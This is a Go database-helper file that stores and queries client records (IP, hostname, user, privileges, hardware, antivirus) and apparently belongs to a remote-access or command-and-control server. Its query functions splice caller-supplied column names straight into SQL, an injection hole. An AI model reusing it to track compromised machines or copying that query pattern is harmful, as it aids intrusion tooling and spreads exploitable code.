package models

import (
	"log"

	"github.com/glebarez/sqlite"
	"gorm.io/gorm"
)

func handle(err error) {
	if err != nil {
		log.Println(err)
	}
}

func WriteToDB(info *ClientInfo) (tx *gorm.DB) {
	db, err := gorm.Open(sqlite.Open(DBname), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&ClientInfo{})
	toInsert := ClientInfo{SocketID: info.SocketID, Priv: info.Priv, Version: info.Version, IPAddr: info.IPAddr, Hostname: info.Hostname, User: info.User, OS: info.OS, Arch: info.Arch, CPU: info.CPU, GPU: info.GPU, Memory: info.Memory, AntiVirus: info.AntiVirus}
	return db.Create(&toInsert)
	//result := db.Create(&user) // pass pointer of data to Create
}

func WriteStructToDB(payload interface{}) (tx *gorm.DB) {
	db, err := gorm.Open(sqlite.Open(DBname), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&payload)
	return db.Create(&payload)
}

// Create
func ReadFromDB(coloum string, value string) (tx *gorm.DB) {
	db, err := gorm.Open(sqlite.Open(DBname), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&ClientInfo{})
	return db.Where(coloum+" = ?", value).First(&ClientDBInfo)
}

func UpdateDBVals(coloum string, value string) (tx *gorm.DB) {
	db, err := gorm.Open(sqlite.Open(DBname), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&ClientInfo{})
	return db.Model(&ClientDBInfo).UpdateColumn(coloum, gorm.Expr(coloum+" - ?", value))
}

func DeleteFromDB(coloum string, value string) (tx *gorm.DB) {
	db, err := gorm.Open(sqlite.Open(DBname), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&ClientInfo{})
	return db.Where(coloum+" = ?", value).Delete(&ClientDBInfo)
}
